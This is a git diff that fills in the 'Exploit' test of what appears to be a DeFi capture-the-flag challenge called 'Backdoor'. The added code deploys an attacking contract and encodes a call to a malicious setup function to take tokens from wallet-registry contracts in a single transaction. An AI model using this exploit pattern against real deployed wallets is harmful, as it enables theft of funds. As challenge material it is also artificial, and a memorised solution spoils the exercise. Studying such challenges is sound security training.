@@ -36,7 +36,32 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        
+        const attackerToken = this.token.connect(attacker);
+        const attackerFactory = this.walletFactory.connect(attacker);
+        const attackerMasterCopy = this.masterCopy.connect(attacker);
+        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+
+        // Deploy attacking contract
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
+        const attackModule = await AttackModuleFactory.deploy(
+            attacker.address,
+            attackerFactory.address,
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address
+        );
+        
+        // ABI call to setupToken() which is malicious
+        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
+        const moduleIFace = new ethers.utils.Interface(moduleABI);
+        const setupData = moduleIFace.encodeFunctionData("setupToken", [
+            attackerToken.address, 
+            attackModule.address
+        ])
+
+        // Do exploit in one transaction (after contract deployment)
+        await attackModule.exploit(users, setupData);
     });
 
     after(async function () {
